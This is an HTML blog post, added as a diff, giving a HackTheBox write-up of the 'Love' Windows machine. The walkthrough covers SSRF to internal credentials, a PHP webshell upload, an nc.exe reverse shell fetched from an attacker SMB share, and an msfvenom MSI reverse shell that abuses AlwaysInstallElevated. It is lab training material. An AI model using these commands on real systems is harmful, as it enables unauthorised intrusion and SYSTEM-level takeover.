@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Love Writeup [HTB]</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Love Writeup [HTB] | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Love Writeup [HTB]" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Love is a Windows based machine that was active since May 1st of 2021 to August 7th, on this machine we will take advantage of and SSRF vulnerability to access to page that is only accesible from the inside, then get access to system that allows us to upload arbitratry files, upload a php webshell and use it to get a reverse shell, finally we will find that “AlwaysInstallElevated” is enabled, so we generate a msi reverse shell and when we install it we get a shell as system." />
+<meta property="og:description" content="Love is a Windows based machine that was active since May 1st of 2021 to August 7th, on this machine we will take advantage of and SSRF vulnerability to access to page that is only accesible from the inside, then get access to system that allows us to upload arbitratry files, upload a php webshell and use it to get a reverse shell, finally we will find that “AlwaysInstallElevated” is enabled, so we generate a msi reverse shell and when we install it we get a shell as system." />
+<link rel="canonical" href="http://localhost:8000/Love" />
+<meta property="og:url" content="http://localhost:8000/Love" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/love/love.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-07T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/love/love.png" />
+<meta property="twitter:title" content="Love Writeup [HTB]" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2021-08-07T00:00:00-05:00","datePublished":"2021-08-07T00:00:00-05:00","description":"Love is a Windows based machine that was active since May 1st of 2021 to August 7th, on this machine we will take advantage of and SSRF vulnerability to access to page that is only accesible from the inside, then get access to system that allows us to upload arbitratry files, upload a php webshell and use it to get a reverse shell, finally we will find that “AlwaysInstallElevated” is enabled, so we generate a msi reverse shell and when we install it we get a shell as system.","headline":"Love Writeup [HTB]","image":"http://localhost:8000/assets/images/love/love.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Love"},"url":"http://localhost:8000/Love"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/love/love.png/../banner.png>
+  
+  <h2>Love Writeup [HTB]</h2>
+  <time datetime="2021-08-07T00:00:00-05:00" class="by-line">07 Aug 2021</time>
+  <p>Love is a Windows based machine that was active since May 1st of 2021 to August 7th, on this machine we will take advantage of and SSRF vulnerability to access to page that is only accesible from the inside, then get access to system that allows us to upload arbitratry files, upload a php webshell and use it to get a reverse shell, finally we will find that “AlwaysInstallElevated” is enabled, so we generate a msi reverse shell and when we install it we get a shell as system.</p>
+
+<h1 id="enumeration"><a href="#header-1"></a>Enumeration</h1>
+
+<p>We start using masscan to find all the available ports and then use nmap to get more information about them.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan <span class="nt">-e</span> tun0 <span class="nt">--rate</span><span class="o">=</span>500 <span class="nt">-p</span> 0-65535 10.10.10.239
+nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 5040,5986,49667,5985,3306,5000,443,135,47001,445,49669,49668,49666,49665,139,49664,49670,80, <span class="nt">-Pn</span> <span class="nt">-o</span> scan.txt 10.10.10.239
+
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not <span class="nb">set</span>
+|_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: Voting System using PHP
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http     Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+|_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: 403 Forbidden
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>staging.love.htb/organizationName<span class="o">=</span>ValentineCorp/stateOrProvinceName<span class="o">=</span>m/countryName<span class="o">=</span><span class="k">in</span>
+| Not valid before: 2021-01-18T14:00:16
+|_Not valid after:  2022-01-18T14:00:16
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| tls-alpn: 
+|_  http/1.1
+445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+3306/tcp  open  mysql?
+| fingerprint-strings: 
+|   FourOhFourRequest, Kerberos, LANDesk-RC, NotesRPC, SSLSessionReq, TerminalServer, TerminalServerCookie, WMSRequest: 
+|_    Host <span class="s1">'10.10.14.109'</span> is not allowed to connect to this MariaDB server
+5000/tcp  open  http         Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
+|_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: 403 Forbidden
+5040/tcp  open  unknown
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>LOVE
+| Subject Alternative Name: DNS:LOVE, DNS:Love
+| Not valid before: 2021-04-11T14:39:19
+|_Not valid after:  2024-04-10T14:39:19
+|_ssl-date: 2021-05-06T19:59:27+00:00<span class="p">;</span> +32m28s from scanner time.
+| tls-alpn: 
+|_  http/1.1
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+
+Service Info: Hosts: www.example.com, LOVE, www.love.htb<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h17m29s, deviation: 3h30m03s, median: 32m27s
+| smb-os-discovery: 
+|   OS: Windows 10 Pro 19042 <span class="o">(</span>Windows 10 Pro 6.3<span class="o">)</span>
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: Love
+|   NetBIOS computer name: LOVE<span class="se">\x</span>00
+|   Workgroup: WORKGROUP<span class="se">\x</span>00
+|_  System <span class="nb">time</span>: 2021-05-06T12:59:14-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-05-06T19:59:12
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Thu May  6 14:27:00 2021 -- 1 IP address (1 host up) scanned in 183.54 seconds</span>
+</code></pre></div></div>
+
+<p>We see a lot of ports open and according to some we can say it is a windows box, also there is a webpage over http and https and another one on port 5000, according to nmap the certificate of the https site belongs to “staging.love.htb”, we could also have checked manually the certificate to find this out, so we add that domain to our hosts, ok now let’s check one site at time, starting for “http://love.htb/”.</p>
+
+<p><img src="/assets/images/love/lovesite.png" alt="" /></p>
+
+<p>It seems like a kind of voting system site, we don’t have credentials so probably not much we can do for now, so let’s try “http://staging.love.htb/”.</p>
+
+<p><img src="/assets/images/love/stagingsite.png" alt="" /></p>
+
+<p>It says secure file scanner, also you could suscribe to something that looks like a news mail system, but most important it has a demo site, if we go to it we see something interesting.</p>
+
+<p><img src="/assets/images/love/demo.png" alt="" /></p>
+
+<p>So it says we can enter a file url and it will scan it, if we start a http server and try to access to our scan file we see that it retrieves it.</p>
+
+<p><img src="/assets/images/love/scan.png" alt="" /></p>
+
+<p>After testing that page for a while it seems like there is no RFI nor LFI, so let’s go to https site.</p>
+
+<p><img src="/assets/images/love/https.png" alt="" /></p>
+
+<p>We get a forbidden status, after bruteforcing and trying to bypass the forbidden with some proxy like headers we get nothing, something similar happens with port 5000.</p>
+
+<p><img src="/assets/images/love/5000.png" alt="" /></p>
+
+<h1 id="gaining-access"><a href="#header-1"></a>Gaining Access</h1>
+
+<p>But we don’t need to bypass the forbidden, we have a page that retrieves any page for us, so let’s try to use it to request itself, se we can try to retrieve the website on port 5000.</p>
+
+<p><img src="/assets/images/love/ssrf.png" alt="" /></p>
+
+<p>We got some credentials for admin on the vote system, running feroxbuster we found that there is an admin panel on “http://love.htb/admin/”, we go there and access with the credentials that we got.</p>
+
+<p><img src="/assets/images/love/votingadmin.png" alt="" /></p>
+
+<p>If we search about this page we find that the source code is hosted on <a href="https://www.sourcecodester.com/php/12306/voting-system-using-php.html">sourcecodester</a>, what we sould do here on an actual engagement should download the source code and analyze it in search of vulnerabilities, but I decided to poke around the application first, so if we go to voters we see that we can add a new one and upload a photo, so let’s try to upload a simple php web shell named test.php, now if we go to <code class="language-plaintext highlighter-rouge">http://love.htb/images/test.php?subterranean=whoami</code> we get the output of the command, I don’t like using “cmd” as parameter since it would be a really easy to catch webshell.</p>
+
+<p><img src="/assets/images/love/webshell.png" alt="" /></p>
+
+<p>So now that we have a webshell let’s get a reverse shell, first we copy nc.exe to our current directory, then we start a smb server, <code class="language-plaintext highlighter-rouge">sudo smbserver.py share . -smb2support</code>, finally we access to <code class="language-plaintext highlighter-rouge">http://love.htb/images/test.php?subterranean=\\10.10.16.34\share\nc.exe%20-e%20cmd.exe%2010.10.16.34%2054321</code>, and we get our shell and retrieve user.txt.</p>
+
+<p><img src="/assets/images/love/shell.png" alt="" /></p>
+
+<h1 id="privilege-escalation"><a href="#header-1"></a>Privilege Escalation</h1>
+
+<p>Running winpeas reveals something interesting, AlwaysInstallElevated is enabled.</p>
+
+<p><img src="/assets/images/love/peas.png" alt="" /></p>
+
+<p>We can check manually this by running:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre></div></div>
+
+<p>So to exploit it first we have to generate an msi file: <code class="language-plaintext highlighter-rouge">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.34 LPORT=54322 -f msi -o shell.msi</code>, impacket’s smbserver is a bit unstable sometimes, so I changed to samba service to start a shared directory, so on the shell that we have on the machine we run <code class="language-plaintext highlighter-rouge">msiexec /quiet /qn /i \\10.10.16.34\share\shell.msi</code>, and with that we will get a shell as system and finish with the machine.</p>
+
+<p><img src="/assets/images/love/system.png" alt="" /></p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#server-side-request-forgering"> Server Side Request Forgering</a> &nbsp;
+  
+  <a href="/tags.html#alwaysinstallelevated"> AlwaysInstallElevated</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
